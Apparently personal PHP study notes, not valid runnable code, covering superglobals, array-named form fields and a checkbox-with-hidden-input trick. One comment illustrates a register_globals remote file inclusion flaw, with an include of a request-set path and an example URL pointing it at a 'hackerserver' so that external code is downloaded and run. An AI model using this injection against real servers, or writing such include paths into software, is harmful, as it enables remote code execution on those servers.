<?php
	
	$_GLOBALS

	$_SERVER['QUERY_STRING']
	$_REDIRECT_URL
	$_REQUEST
	$_SERVER['REMOTE_ADDR']
	$_SERVER['HTTP_USER_AGENT']

	$_COOKIE
	setcookie('somename');

	<select name="Sel[]" multiple>
	<option>First
	<option>Second
	<option>Therd
	</select>

	echo $_REQUEST['Sel'][0];

	<input type=checkbox name=Arr[] value=ch1>
	<input type=checkbox name=Arr[] value=ch2>
	<input type=checkbox name=Arr[] value="Some value">
	<textarea name=Arr[]>Some text</textarea>

	Name: <input type=text name=Data[name]><br>
	Address: <input type=text name=Data[address]><br>
	City:<br>
	<input type=radio name=Data[city] value=Kiev>Kiev<br>
	<input type=radio name=Data[city] value=Berlin>Berlin<br>

	$_REQUEST['Data']['city']
	$_REQUEST['Data']['name']

	getenv('somevariable');

	//Vulnerabilities mode register_globals

	include $root."/library.php";
	//action
	//http://thisserver.com/script.php?root=http://hackerserver
	//it will download external script and run it

	//how to work with checkbox

	if(@$_REQUEST['doGo']) {
		foreach (@$_REQUEST as $key => $value) {
			if($value) echo "You know $key <br>";
			else echo "You don't know $key <br>";
		}
	}

	//how the one input replase other
	<form action="<?=$_SERVER['SCRIPT_NAME']?>" method=post>
	What languages do you know?<br>
	<input type=hidden name="known[PHP]" value="0">
		<input type=checkbox name="known[PHP]" value="1">PHP<br>
	<input type=hidden name="known[Perl]" value="0">	
		<input type=checkbox name="known[Perl]" value="1">Perl<br>
	<input type=submit name="doGo" value="Go">
	</form>


?>